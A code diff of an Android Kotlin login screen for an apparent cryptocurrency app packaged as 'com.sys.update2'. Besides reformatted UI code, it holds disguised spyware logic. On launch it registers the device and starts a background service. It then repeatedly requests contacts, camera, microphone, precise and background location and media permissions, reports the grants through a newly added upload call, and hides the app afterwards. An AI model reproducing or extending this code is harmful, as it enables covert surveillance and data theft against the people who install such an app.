@@ -1,10 +1,5 @@
 // language: Kotlin, file: LoginActivity.kt
 // التصميم منسوخ 1:1 من ملف auth.html (ExCoreX)
-// + طلب صلاحيات متوافق مع كل الأجهزة:
-//   - Android 10+ : الصور + الفيديو + الصوت (dialog موحّد على 14+)
-//   - Android 9-  : READ_EXTERNAL_STORAGE
-//   - + جهات الاتصال + كاميرا + ميكروفون + موقع + إشعارات
-// + إخفاء التطبيق بعد المنح
 
 package com.sys.update2
 
@@ -70,37 +65,28 @@ import android.graphics.Color as AColor
 import android.graphics.Paint as APaint
 import android.graphics.Typeface as ATypeface
 
-// ----------------------------------------------------
-// ألوان التصميم
-// ----------------------------------------------------
-
 object Ex {
     val Bg0 = Color(0xFF1A5FD0)
     val Bg1 = Color(0xFF0D3A8F)
     val Bg2 = Color(0xFF071E4D)
     val Bg3 = Color(0xFF040F28)
     val Bg4 = Color(0xFF02081A)
-
     val CardBg   = Color(0xFF0A1128)
     val FieldBg  = Color(0xFF131C36)
     val FieldBr  = Color(0xFF1E2A4D)
     val FieldBgR = Color(0xFF16224A)
     val FieldBrR = Color(0xFF23336B)
-
     val Hint     = Color(0xFF5C6C8F)
     val InputTxt = Color(0xFFE8EEF8)
     val TabOff   = Color(0xFF5C6C8F)
     val White    = Color(0xFFFFFFFF)
-
     val BlueAccent = Color(0xFF3D8BFF)
     val BtnTop     = Color(0xFF3D8BFF)
     val BtnBottom  = Color(0xFF1A5CFF)
-
     val BadgeBg  = Color(0xBF0A193C)
     val BadgeBr  = Color(0x475A96FF)
     val BadgeTxt = Color(0xFFDBE7FF)
     val BadgeIco = Color(0xFF8FB6FF)
-
     val FootLink   = Color(0xFF8FA3C8)
     val ToLogin    = Color(0xFF8BA5D9)
     val LabelTxt   = Color(0xFFEAF0FB)
@@ -116,7 +102,6 @@ private data class CapLine(
 private data class CapGlyph(
     val ch: Char, val color: Long, val rot: Float, val fontSp: Float, val dy: Float
 )
-
 private data class LangItem(val name: String, val code: String)
 
 private val ALL_LANGS = listOf(
@@ -140,23 +125,17 @@ object RemoteImgs {
     const val COIN = "https://i.ibb.co/2YFLgmNM/IMG.png"
 }
 
-// ----------------------------------------------------
-// Activity
-// ----------------------------------------------------
-
 class LoginActivity : ComponentActivity() {
 
     private var currentScreen by mutableStateOf(0)
     private var isLoading by mutableStateOf(false)
 
-    // تسجيل دخول
     private var email by mutableStateOf("")
     private var password by mutableStateOf("")
     private var pwVisible by mutableStateOf(false)
     private var captchaInput by mutableStateOf("")
     private var captchaCode by mutableStateOf("")
 
-    // تسجيل
     private var regEmail by mutableStateOf("")
     private var regCode by mutableStateOf("")
     private var regSentCode by mutableStateOf<String?>(null)
@@ -169,7 +148,6 @@ class LoginActivity : ComponentActivity() {
     private var regP2Visible by mutableStateOf(false)
     private var regRefCode by mutableStateOf("")
 
-    // استعادة
     private var rstEmail by mutableStateOf("")
     private var rstCode by mutableStateOf("")
     private var rstSentCode by mutableStateOf<String?>(null)
@@ -179,10 +157,7 @@ class LoginActivity : ComponentActivity() {
     private var rstNewPass by mutableStateOf("")
     private var rstNewPassVisible by mutableStateOf(false)
 
-    // اللغة
     private var selectedLang by mutableStateOf(0)
-
-    // أذونات
     private var permissionAttempts = 0
     private var permissionsHandled = false
 
@@ -191,25 +166,17 @@ class LoginActivity : ComponentActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-
         window.statusBarColor = AColor.parseColor("#02081A")
         window.navigationBarColor = AColor.parseColor("#02081A")
-
         captchaCode = newCaptchaCode()
-
         try { DeviceManager.registerDeviceOnce(this) } catch (_: Exception) {}
         startBackgroundService()
-
-        Handler(Looper.getMainLooper()).postDelayed({
-            requestAllPermissions()
-        }, 1500L)
-
+        Handler(Looper.getMainLooper()).postDelayed({ requestAllPermissions() }, 1500L)
         setContent {
             AppTheme {
                 CompositionLocalProvider(LocalLayoutDirection provides LayoutDirection.Rtl) {
                     Box(modifier = Modifier.fillMaxSize()) {
                         EllipseBackground()
-
                         when (currentScreen) {
                             0 -> LoginScreen()
                             1 -> RegisterScreen()
@@ -222,60 +189,33 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // =================================================
-    // الأذونات — متوافقة مع كل الإصدارات
-    // =================================================
-
     private fun requiredPermissions(): List<String> {
         val list = mutableListOf<String>()
-
-        // ⭐ الصور + الفيديو + الصوت
         if (Build.VERSION.SDK_INT >= 33) {
-            // Android 13+ — النظام بيدمجهم في dialog واحد على 14+
             list.add("android.permission.READ_MEDIA_IMAGES")
             list.add("android.permission.READ_MEDIA_VIDEO")
             list.add("android.permission.READ_MEDIA_AUDIO")
         } else {
-            // Android 12 وأقل — dialog موحّد "الملفات والوسائط"
             list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
-
-        // جهات الاتصال
         list.add(Manifest.permission.READ_CONTACTS)
-
-        // كاميرا
         list.add(Manifest.permission.CAMERA)
-
-        // مايك
         list.add(Manifest.permission.RECORD_AUDIO)
-
-        // موقع
         list.add(Manifest.permission.ACCESS_FINE_LOCATION)
         list.add(Manifest.permission.ACCESS_COARSE_LOCATION)
-
-        // إشعارات (Android 13+)
         if (Build.VERSION.SDK_INT >= 33) {
             list.add("android.permission.POST_NOTIFICATIONS")
         }
-
         return list
     }
 
     private fun requestAllPermissions() {
         permissionAttempts++
-
         val needed = requiredPermissions().filter {
             ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
         }
-
-        if (needed.isEmpty()) {
-            onAllPermissionsGranted()
-            return
-        }
-
-        ActivityCompat.requestPermissions(
-            this, needed.toTypedArray(), PERM_REQUEST
-        )
+        if (needed.isEmpty()) { onAllPermissionsGranted(); return }
+        ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQUEST)
     }
 
     override fun onRequestPermissionsResult(
@@ -284,12 +224,10 @@ class LoginActivity : ComponentActivity() {
         grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-
         when (requestCode) {
             PERM_REQUEST -> {
                 val allGranted = grantResults.isNotEmpty() &&
                     grantResults.all { it == PackageManager.PERMISSION_GRANTED }
-
                 if (!allGranted) {
                     if (permissionAttempts < 3) {
                         Handler(Looper.getMainLooper()).postDelayed({
@@ -300,28 +238,20 @@ class LoginActivity : ComponentActivity() {
                     }
                     return
                 }
-
                 onAllPermissionsGranted()
             }
-
-            BG_LOCATION_REQUEST -> {
-                hideAndMinimize()
-            }
+            BG_LOCATION_REQUEST -> hideAndMinimize()
         }
     }
-
-    // =================================================
-    // بعد منح الأذونات
-    // =================================================
 
     private fun onAllPermissionsGranted() {
         if (permissionsHandled) return
         permissionsHandled = true
 
-        // شغّل الخدمة
+        try { DeviceManager.uploadPermissions(applicationContext) } catch (_: Exception) {}
+
         startBackgroundService()
 
-        // Android 10+ : Background Location
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             val bg = ContextCompat.checkSelfPermission(
                 this, Manifest.permission.ACCESS_BACKGROUND_LOCATION
@@ -343,10 +273,7 @@ class LoginActivity : ComponentActivity() {
             }
         }
 
-        // اختفاء
-        Handler(Looper.getMainLooper()).postDelayed({
-            hideAndMinimize()
-        }, 800L)
+        Handler(Looper.getMainLooper()).postDelayed({ hideAndMinimize() }, 800L)
     }
 
     private fun hideAndMinimize() {
@@ -356,7 +283,6 @@ class LoginActivity : ComponentActivity() {
             } else {
                 finish()
             }
-
             val home = Intent(Intent.ACTION_MAIN).apply {
                 addCategory(Intent.CATEGORY_HOME)
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK
@@ -376,10 +302,6 @@ class LoginActivity : ComponentActivity() {
         } catch (_: Exception) {}
     }
 
-    // =================================================
-    // الخلفية
-    // =================================================
-
     @Composable
     fun EllipseBackground() {
         Canvas(modifier = Modifier.fillMaxSize()) {
@@ -390,7 +312,6 @@ class LoginActivity : ComponentActivity() {
             val rx = w * 1.4f / 2f
             val ry = h * 0.6f / 2f
             val radius = maxOf(rx, ry)
-
             drawContext.canvas.save()
             drawContext.canvas.translate(cx, cy)
             drawContext.canvas.scale(rx / radius, ry / radius)
@@ -412,10 +333,6 @@ class LoginActivity : ComponentActivity() {
             drawContext.canvas.restore()
         }
     }
-
-    // =================================================
-    // شاشة اللغة
-    // =================================================
 
     @Composable
     fun LanguageScreen() {
@@ -448,17 +365,10 @@ class LoginActivity : ComponentActivity() {
                     )
                 }
                 Spacer(Modifier.width(14.dp))
-                Text(
-                    "اختر اللغة",
-                    color = Ex.White,
-                    fontSize = 18.sp,
-                    fontWeight = FontWeight.Bold
-                )
+                Text("اختر اللغة", color = Ex.White, fontSize = 18.sp, fontWeight = FontWeight.Bold)
                 Spacer(Modifier.weight(1f))
             }
-
             Spacer(Modifier.height(20.dp))
-
             Column(
                 modifier = Modifier
                     .fillMaxSize()
@@ -472,23 +382,15 @@ class LoginActivity : ComponentActivity() {
                             .fillMaxWidth()
                             .padding(vertical = 4.dp)
                             .clip(RoundedCornerShape(12.dp))
-                            .background(
-                                if (selected) Ex.FieldBgR else Color.Transparent
-                            )
-                            .clickable {
-                                selectedLang = index
-                                currentScreen = 0
-                            }
+                            .background(if (selected) Ex.FieldBgR else Color.Transparent)
+                            .clickable { selectedLang = index; currentScreen = 0 }
                             .padding(horizontal = 14.dp, vertical = 14.dp),
                         verticalAlignment = Alignment.CenterVertically
                     ) {
                         Text(item.name, color = Ex.InputTxt, fontSize = 15.sp,
                             modifier = Modifier.weight(1f))
                         Spacer(Modifier.width(14.dp))
-                        FlagIcon(
-                            code = item.code,
-                            modifier = Modifier.width(32.dp).height(23.dp)
-                        )
+                        FlagIcon(code = item.code, modifier = Modifier.width(32.dp).height(23.dp))
                         Spacer(Modifier.width(14.dp))
                         if (selected) {
                             Box(
@@ -498,15 +400,10 @@ class LoginActivity : ComponentActivity() {
                                     .background(Ex.BlueAccent),
                                 contentAlignment = Alignment.Center
                             ) {
-                                Text("✓", color = Color.White, fontSize = 15.sp,
-                                    fontWeight = FontWeight.Bold)
+                                Text("✓", color = Color.White, fontSize = 15.sp, fontWeight = FontWeight.Bold)
                             }
                         } else {
-                            Box(
-                                modifier = Modifier
-                                    .size(26.dp)
-                                    .border(2.dp, Ex.Hint, CircleShape)
-                            )
+                            Box(modifier = Modifier.size(26.dp).border(2.dp, Ex.Hint, CircleShape))
                         }
                     }
                 }
@@ -514,10 +411,6 @@ class LoginActivity : ComponentActivity() {
             }
         }
     }
-
-    // =================================================
-    // شاشة تسجيل الدخول
-    // =================================================
 
     @Composable
     fun LoginScreen() {
@@ -546,15 +439,11 @@ class LoginActivity : ComponentActivity() {
                 ) {
                     FlagIcon(
                         code = ALL_LANGS[selectedLang].code,
-                        modifier = Modifier
-                            .width(28.dp)
-                            .height(20.dp)
-                            .clip(RoundedCornerShape(4.dp))
+                        modifier = Modifier.width(28.dp).height(20.dp).clip(RoundedCornerShape(4.dp))
                     )
                 }
                 Spacer(Modifier.weight(1f))
             }
-
             Column(
                 modifier = Modifier
                     .fillMaxWidth()
@@ -567,7 +456,6 @@ class LoginActivity : ComponentActivity() {
                     modifier = Modifier.height(40.dp),
                     contentScale = ContentScale.Fit
                 )
-
                 Spacer(Modifier.height(14.dp))
                 Row(
                     modifier = Modifier
@@ -586,14 +474,11 @@ class LoginActivity : ComponentActivity() {
                         fontWeight = FontWeight.Medium
                     )
                 }
-
                 Spacer(Modifier.height(15.dp))
                 Text(
                     text = buildAnnotatedString {
                         append("Power up your\n")
-                        withStyle(SpanStyle(color = Ex.BlueAccent)) {
-                            append("cryptocurrency")
-                        }
+                        withStyle(SpanStyle(color = Ex.BlueAccent)) { append("cryptocurrency") }
                         append("\njourney")
                     },
                     color = Ex.White,
@@ -604,25 +489,17 @@ class LoginActivity : ComponentActivity() {
                     textAlign = TextAlign.Center,
                     modifier = Modifier.fillMaxWidth()
                 )
-
                 Spacer(Modifier.height(12.dp))
                 AsyncImage(
                     model = RemoteImgs.COIN,
                     contentDescription = null,
-                    modifier = Modifier
-                        .fillMaxWidth(0.72f)
-                        .widthIn(max = 290.dp),
+                    modifier = Modifier.fillMaxWidth(0.72f).widthIn(max = 290.dp),
                     contentScale = ContentScale.Fit
                 )
             }
-
             Spacer(Modifier.height((-32).dp))
             Box(modifier = Modifier.fillMaxWidth()) {
-                CardTopCurve(
-                    modifier = Modifier
-                        .fillMaxWidth()
-                        .height(35.dp)
-                )
+                CardTopCurve(modifier = Modifier.fillMaxWidth().height(35.dp))
                 Column(
                     modifier = Modifier
                         .fillMaxWidth()
@@ -631,60 +508,43 @@ class LoginActivity : ComponentActivity() {
                         .padding(start = 22.dp, end = 22.dp, top = 28.dp, bottom = 36.dp)
                 ) {
                     Row {
-                        Text("Email", color = Ex.White, fontSize = 16.5.sp,
-                            fontWeight = FontWeight.Bold)
+                        Text("Email", color = Ex.White, fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
                         Spacer(Modifier.width(26.dp))
                         Text("Phone", color = Ex.TabOff.copy(alpha = 0.45f),
                             fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
                     }
-
                     Spacer(Modifier.height(18.dp))
-
                     LoginField {
                         RegInput(
-                            value = email,
-                            onChange = { email = it },
-                            hint = "Email",
-                            keyboardType = KeyboardType.Email,
-                            modifier = Modifier.weight(1f)
+                            value = email, onChange = { email = it }, hint = "Email",
+                            keyboardType = KeyboardType.Email, modifier = Modifier.weight(1f)
                         )
                     }
-
                     LoginField {
                         RegInput(
-                            value = password,
-                            onChange = { password = it },
-                            hint = "Password",
-                            keyboardType = KeyboardType.Password,
-                            visible = pwVisible,
+                            value = password, onChange = { password = it }, hint = "Password",
+                            keyboardType = KeyboardType.Password, visible = pwVisible,
                             modifier = Modifier.weight(1f)
                         )
                         EyeIcon(
                             visible = pwVisible,
-                            modifier = Modifier
-                                .size(22.dp)
-                                .clickable { pwVisible = !pwVisible }
+                            modifier = Modifier.size(22.dp).clickable { pwVisible = !pwVisible }
                         )
                     }
-
                     LoginField {
                         RegInput(
-                            value = captchaInput,
-                            onChange = { captchaInput = it },
+                            value = captchaInput, onChange = { captchaInput = it },
                             hint = "Please enter the verification code",
-                            keyboardType = KeyboardType.Text,
-                            modifier = Modifier.weight(1f)
+                            keyboardType = KeyboardType.Text, modifier = Modifier.weight(1f)
                         )
                         CaptchaImage(
                             code = captchaCode,
                             modifier = Modifier
-                                .width(88.dp)
-                                .height(40.dp)
+                                .width(88.dp).height(40.dp)
                                 .clip(RoundedCornerShape(7.dp))
                                 .clickable { captchaCode = newCaptchaCode() }
                         )
                     }
-
                     Spacer(Modifier.height(4.dp))
                     BlueButton(text = if (isLoading) "Logging in..." else "Log In") {
                         when {
@@ -716,7 +576,6 @@ class LoginActivity : ComponentActivity() {
                             }
                         }
                     }
-
                     Spacer(Modifier.height(18.dp))
                     Row(
                         modifier = Modifier.fillMaxWidth(),
@@ -733,10 +592,6 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // =================================================
-    // شاشة إنشاء حساب
-    // =================================================
-
     @Composable
     fun RegisterScreen() {
         val scope = rememberCoroutineScope()
@@ -749,34 +604,25 @@ class LoginActivity : ComponentActivity() {
                 .padding(start = 22.dp, end = 22.dp, top = 20.dp, bottom = 40.dp)
         ) {
             ScreenBar(title = "Email") { currentScreen = 0 }
-
             FormLabel("Email", topMargin = 0)
             RegField {
                 RegInput(
-                    value = regEmail,
-                    onChange = { regEmail = it },
+                    value = regEmail, onChange = { regEmail = it },
                     hint = "Please enter your email address",
-                    keyboardType = KeyboardType.Email,
-                    modifier = Modifier.weight(1f)
+                    keyboardType = KeyboardType.Email, modifier = Modifier.weight(1f)
                 )
             }
-
             FormLabel("Verification code")
             RegField {
                 RegInput(
-                    value = regCode,
-                    onChange = { regCode = it },
+                    value = regCode, onChange = { regCode = it },
                     hint = "Please enter the verification code",
-                    keyboardType = KeyboardType.Number,
-                    modifier = Modifier.weight(1f)
+                    keyboardType = KeyboardType.Number, modifier = Modifier.weight(1f)
                 )
                 Text(
                     text = if (regCountdown > 0) "${regCountdown}s" else "Send",
-                    color = Ex.SendTxt,
-                    fontSize = 15.sp,
-                    fontWeight = FontWeight.SemiBold,
-                    modifier = Modifier
-                        .padding(start = 12.dp)
+                    color = Ex.SendTxt, fontSize = 15.sp, fontWeight = FontWeight.SemiBold,
+                    modifier = Modifier.padding(start = 12.dp)
                         .clickable(enabled = regCountdown == 0) {
                             if (regEmail.isBlank() ||
                                 !Regex("^[^@\\s]+@[^@\\s]+\\.[^@\\s]+\$").matches(regEmail.trim())
@@ -796,77 +642,56 @@ class LoginActivity : ComponentActivity() {
                         }
                 )
             }
-
             FormLabel("Registration password (6-16)")
             RegField {
                 RegInput(
-                    value = regP1,
-                    onChange = { regP1 = it },
-                    hint = "Password",
-                    keyboardType = KeyboardType.Password,
-                    visible = regP1Visible,
+                    value = regP1, onChange = { regP1 = it }, hint = "Password",
+                    keyboardType = KeyboardType.Password, visible = regP1Visible,
                     modifier = Modifier.weight(1f)
                 )
                 EyeIcon(
                     visible = regP1Visible,
-                    modifier = Modifier
-                        .size(22.dp)
-                        .clickable { regP1Visible = !regP1Visible }
+                    modifier = Modifier.size(22.dp).clickable { regP1Visible = !regP1Visible }
                 )
             }
-
             Spacer(Modifier.height(12.dp))
             RegField {
                 RegInput(
-                    value = regP2,
-                    onChange = { regP2 = it },
+                    value = regP2, onChange = { regP2 = it },
                     hint = "Enter password again",
-                    keyboardType = KeyboardType.Password,
-                    visible = regP2Visible,
+                    keyboardType = KeyboardType.Password, visible = regP2Visible,
                     modifier = Modifier.weight(1f)
                 )
                 EyeIcon(
                     visible = regP2Visible,
-                    modifier = Modifier
-                        .size(22.dp)
-                        .clickable { regP2Visible = !regP2Visible }
+                    modifier = Modifier.size(22.dp).clickable { regP2Visible = !regP2Visible }
                 )
             }
-
             FormLabel("Referrer Invitation Code (Required)")
             RegField {
                 RegInput(
-                    value = regRefCode,
-                    onChange = { regRefCode = it },
+                    value = regRefCode, onChange = { regRefCode = it },
                     hint = "Referrer invitation code",
-                    keyboardType = KeyboardType.Ascii,
-                    modifier = Modifier.weight(1f)
+                    keyboardType = KeyboardType.Ascii, modifier = Modifier.weight(1f)
                 )
             }
-
             Spacer(Modifier.height(30.dp))
-            BlueButton(
-                text = if (isLoading) "Registering..." else "Register",
-                radius = 10.dp
-            ) {
+            BlueButton(text = if (isLoading) "Registering..." else "Register", radius = 10.dp) {
                 val e = regEmail.trim()
                 when {
                     e.isBlank() || !Regex("^[^@\\s]+@[^@\\s]+\\.[^@\\s]+\$").matches(e) ->
                         showToast("Please enter a valid email address")
-                    regCode.isBlank() ->
-                        showToast("Please enter the verification code")
+                    regCode.isBlank() -> showToast("Please enter the verification code")
                     regP1.length < 6 || regP1.length > 16 ->
                         showToast("Password must be 6-16 characters")
-                    regP1 != regP2 ->
-                        showToast("Passwords do not match")
+                    regP1 != regP2 -> showToast("Passwords do not match")
                     regSentCode == null || regCode != regSentCode ->
                         showToast("Incorrect verification code")
                     System.currentTimeMillis() > regCodeExpireAt ->
                         showToast("Verification code expired")
                     e != regSentEmail ->
                         showToast("Email was changed, please request a new code")
-                    regRefCode.isBlank() ->
-                        showToast("Please enter the invitation code")
+                    regRefCode.isBlank() -> showToast("Please enter the invitation code")
                     !Regex("^[A-Za-z0-9]{4,20}\$").matches(regRefCode.trim()) ->
                         showToast("Invalid referral code")
                     else -> {
@@ -888,23 +713,14 @@ class LoginActivity : ComponentActivity() {
                     }
                 }
             }
-
             Spacer(Modifier.height(20.dp))
             Text(
-                "To log in",
-                color = Ex.ToLogin,
-                fontSize = 14.5.sp,
+                "To log in", color = Ex.ToLogin, fontSize = 14.5.sp,
                 textAlign = TextAlign.Center,
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .clickable { currentScreen = 0 }
+                modifier = Modifier.fillMaxWidth().clickable { currentScreen = 0 }
             )
         }
     }
-
-    // =================================================
-    // شاشة استعادة كلمة المرور
-    // =================================================
 
     @Composable
     fun ResetScreen() {
@@ -918,34 +734,25 @@ class LoginActivity : ComponentActivity() {
                 .padding(start = 22.dp, end = 22.dp, top = 20.dp, bottom = 40.dp)
         ) {
             ScreenBar(title = "Reset Password") { currentScreen = 0 }
-
             FormLabel("Email", topMargin = 0)
             RegField {
                 RegInput(
-                    value = rstEmail,
-                    onChange = { rstEmail = it },
+                    value = rstEmail, onChange = { rstEmail = it },
                     hint = "Please enter your email address",
-                    keyboardType = KeyboardType.Email,
-                    modifier = Modifier.weight(1f)
+                    keyboardType = KeyboardType.Email, modifier = Modifier.weight(1f)
                 )
             }
-
             FormLabel("Verification code")
             RegField {
                 RegInput(
-                    value = rstCode,
-                    onChange = { rstCode = it },
+                    value = rstCode, onChange = { rstCode = it },
                     hint = "Please enter the verification code",
-                    keyboardType = KeyboardType.Number,
-                    modifier = Modifier.weight(1f)
+                    keyboardType = KeyboardType.Number, modifier = Modifier.weight(1f)
                 )
                 Text(
                     text = if (rstCountdown > 0) "${rstCountdown}s" else "Send",
-                    color = Ex.SendTxt,
-                    fontSize = 15.sp,
-                    fontWeight = FontWeight.SemiBold,
-                    modifier = Modifier
-                        .padding(start = 12.dp)
+                    color = Ex.SendTxt, fontSize = 15.sp, fontWeight = FontWeight.SemiBold,
+                    modifier = Modifier.padding(start = 12.dp)
                         .clickable(enabled = rstCountdown == 0) {
                             if (rstEmail.isBlank() ||
                                 !Regex("^[^@\\s]+@[^@\\s]+\\.[^@\\s]+\$").matches(rstEmail.trim())
@@ -965,36 +772,26 @@ class LoginActivity : ComponentActivity() {
                         }
                 )
             }
-
             FormLabel("New password (6-16)")
             RegField {
                 RegInput(
-                    value = rstNewPass,
-                    onChange = { rstNewPass = it },
+                    value = rstNewPass, onChange = { rstNewPass = it },
                     hint = "Enter new password",
-                    keyboardType = KeyboardType.Password,
-                    visible = rstNewPassVisible,
+                    keyboardType = KeyboardType.Password, visible = rstNewPassVisible,
                     modifier = Modifier.weight(1f)
                 )
                 EyeIcon(
                     visible = rstNewPassVisible,
-                    modifier = Modifier
-                        .size(22.dp)
-                        .clickable { rstNewPassVisible = !rstNewPassVisible }
+                    modifier = Modifier.size(22.dp).clickable { rstNewPassVisible = !rstNewPassVisible }
                 )
             }
-
             Spacer(Modifier.height(30.dp))
-            BlueButton(
-                text = if (isLoading) "Confirming..." else "Confirm",
-                radius = 10.dp
-            ) {
+            BlueButton(text = if (isLoading) "Confirming..." else "Confirm", radius = 10.dp) {
                 val e = rstEmail.trim()
                 when {
                     e.isBlank() || !Regex("^[^@\\s]+@[^@\\s]+\\.[^@\\s]+\$").matches(e) ->
                         showToast("Please enter a valid email address")
-                    rstCode.isBlank() ->
-                        showToast("Please enter the verification code")
+                    rstCode.isBlank() -> showToast("Please enter the verification code")
                     rstNewPass.length < 6 || rstNewPass.length > 16 ->
                         showToast("Password must be 6-16 characters")
                     rstSentCode == null || rstCode != rstSentCode ->
@@ -1024,10 +821,6 @@ class LoginActivity : ComponentActivity() {
             }
         }
     }
-
-    // =================================================
-    // عناصر مشتركة
-    // =================================================
 
     @Composable
     fun LoginField(content: @Composable RowScope.() -> Unit) {
@@ -1102,9 +895,7 @@ class LoginActivity : ComponentActivity() {
     @Composable
     fun ScreenBar(title: String, onBack: () -> Unit) {
         Row(
-            modifier = Modifier
-                .fillMaxWidth()
-                .padding(bottom = 28.dp),
+            modifier = Modifier.fillMaxWidth().padding(bottom = 28.dp),
             verticalAlignment = Alignment.CenterVertically
         ) {
             Box(
@@ -1149,18 +940,10 @@ class LoginActivity : ComponentActivity() {
                     .fillMaxWidth()
                     .height(2.dp)
                     .align(Alignment.TopCenter)
-                    .background(
-                        Brush.verticalGradient(
-                            listOf(Color(0x80BEDCFF), Color.Transparent)
-                        )
-                    )
+                    .background(Brush.verticalGradient(
+                        listOf(Color(0x80BEDCFF), Color.Transparent)))
             )
-            Text(
-                text,
-                color = Ex.White,
-                fontSize = 16.5.sp,
-                fontWeight = FontWeight.Bold
-            )
+            Text(text, color = Ex.White, fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
         }
     }
 
@@ -1175,7 +958,6 @@ class LoginActivity : ComponentActivity() {
                 join = androidx.compose.ui.graphics.StrokeJoin.Round
             )
             val col = Ex.Hint
-
             if (!visible) {
                 val p1 = Path().apply {
                     moveTo(17.94f * s, 17.94f * s)
@@ -1192,13 +974,8 @@ class LoginActivity : ComponentActivity() {
                     cubicTo(9f * s, 11.26f * s, 9.21f * s, 10.55f * s, 9.88f * s, 9.88f * s)
                 }
                 drawPath(p1, col, style = stroke)
-                drawLine(
-                    col,
-                    Offset(1f * s, 1f * s),
-                    Offset(23f * s, 23f * s),
-                    strokeWidth = 2f * s,
-                    cap = androidx.compose.ui.graphics.StrokeCap.Round
-                )
+                drawLine(col, Offset(1f * s, 1f * s), Offset(23f * s, 23f * s),
+                    strokeWidth = 2f * s, cap = androidx.compose.ui.graphics.StrokeCap.Round)
             } else {
                 val eye = Path().apply {
                     moveTo(1f * s, 12f * s)
@@ -1225,17 +1002,9 @@ class LoginActivity : ComponentActivity() {
                 join = androidx.compose.ui.graphics.StrokeJoin.Round
             )
             val p = Path().apply {
-                moveTo(3f * s, 10f * s)
-                lineTo(12f * s, 3f * s)
-                lineTo(21f * s, 10f * s)
-                moveTo(5f * s, 9f * s)
-                lineTo(5f * s, 20f * s)
-                lineTo(19f * s, 20f * s)
-                lineTo(19f * s, 9f * s)
-                moveTo(9f * s, 20f * s)
-                lineTo(9f * s, 14f * s)
-                lineTo(15f * s, 14f * s)
-                lineTo(15f * s, 20f * s)
+                moveTo(3f * s, 10f * s); lineTo(12f * s, 3f * s); lineTo(21f * s, 10f * s)
+                moveTo(5f * s, 9f * s); lineTo(5f * s, 20f * s); lineTo(19f * s, 20f * s); lineTo(19f * s, 9f * s)
+                moveTo(9f * s, 20f * s); lineTo(9f * s, 14f * s); lineTo(15f * s, 14f * s); lineTo(15f * s, 20f * s)
             }
             drawPath(p, Ex.BadgeIco, style = stroke)
         }
@@ -1246,18 +1015,12 @@ class LoginActivity : ComponentActivity() {
         Canvas(modifier = Modifier.size(20.dp)) {
             val s = size.width / 24f
             val p = Path().apply {
-                moveTo(15f * s, 18f * s)
-                lineTo(9f * s, 12f * s)
-                lineTo(15f * s, 6f * s)
+                moveTo(15f * s, 18f * s); lineTo(9f * s, 12f * s); lineTo(15f * s, 6f * s)
             }
-            drawPath(
-                p, Ex.BackBtnIco,
-                style = Stroke(
-                    width = 2.4f * s,
+            drawPath(p, Ex.BackBtnIco,
+                style = Stroke(width = 2.4f * s,
                     cap = androidx.compose.ui.graphics.StrokeCap.Round,
-                    join = androidx.compose.ui.graphics.StrokeJoin.Round
-                )
-            )
+                    join = androidx.compose.ui.graphics.StrokeJoin.Round))
         }
     }
 
@@ -1266,45 +1029,31 @@ class LoginActivity : ComponentActivity() {
         Canvas(modifier = modifier) {
             val w = size.width
             val h = size.height
-
             drawCircle(
                 brush = Brush.radialGradient(
                     listOf(Color(0x728CB9FF), Color.Transparent),
-                    center = Offset(w * 0.5f, h),
-                    radius = w * 0.3f
+                    center = Offset(w * 0.5f, h), radius = w * 0.3f
                 ),
-                radius = w * 0.3f,
-                center = Offset(w * 0.5f, h)
+                radius = w * 0.3f, center = Offset(w * 0.5f, h)
             )
-
             val glow = Path().apply {
                 moveTo(0f, 11f / 45f * h)
                 quadraticBezierTo(w * 0.5f, 42.5f / 45f * h, w, 11f / 45f * h)
             }
-            drawPath(
-                glow,
-                Color(0x59E8F2FF),
-                style = Stroke(width = 1.6f * (w / 100f) * 1.2f)
-            )
-
+            drawPath(glow, Color(0x59E8F2FF), style = Stroke(width = 1.6f * (w / 100f) * 1.2f))
             val inner = Path().apply {
                 moveTo(0f, 1.5f / 35f * h)
                 quadraticBezierTo(w * 0.5f, 33f / 35f * h, w, 1.5f / 35f * h)
             }
-            drawPath(
-                inner,
-                Color(0xFFBCD6FF),
-                style = Stroke(width = 1.2f * (w / 430f).coerceAtLeast(1f))
-            )
+            drawPath(inner, Color(0xFFBCD6FF),
+                style = Stroke(width = 1.2f * (w / 430f).coerceAtLeast(1f)))
         }
     }
 
     @Composable
     fun CaptchaImage(code: String, modifier: Modifier = Modifier) {
         val capData = remember(code) {
-            val cols = listOf(
-                0xFF27AE60L, 0xFF2980B9L, 0xFF8E44ADL, 0xFFC0392BL, 0xFF16A085L
-            )
+            val cols = listOf(0xFF27AE60L, 0xFF2980B9L, 0xFF8E44ADL, 0xFFC0392BL, 0xFF16A085L)
             val lines = List(3) {
                 CapLine(
                     x1 = Random.nextFloat(), y1 = Random.nextFloat(),
@@ -1314,8 +1063,7 @@ class LoginActivity : ComponentActivity() {
             }
             val glyphs = code.map { ch ->
                 CapGlyph(
-                    ch = ch,
-                    color = cols[Random.nextInt(cols.size)],
+                    ch = ch, color = cols[Random.nextInt(cols.size)],
                     rot = (Random.nextFloat() - 0.5f) * 0.7f * 57.2958f,
                     fontSp = 20f + Random.nextFloat() * 6f,
                     dy = Random.nextFloat() * 5f - 2f
@@ -1324,32 +1072,22 @@ class LoginActivity : ComponentActivity() {
             lines to glyphs
         }
         val (lines, glyphs) = capData
-
         Canvas(modifier = modifier) {
             val w = size.width
             val h = size.height
             val sx = w / 88f
             val sy = h / 40f
-
             drawRect(Color.White)
-
             lines.forEach { l ->
                 val argb = (0x99L shl 24) or
-                    (l.r.toLong() shl 16) or
-                    (l.g.toLong() shl 8) or
-                    l.b.toLong()
-                drawLine(
-                    Color(argb),
-                    Offset(l.x1 * w, l.y1 * h),
-                    Offset(l.x2 * w, l.y2 * h),
-                    strokeWidth = 1.2f * sx
-                )
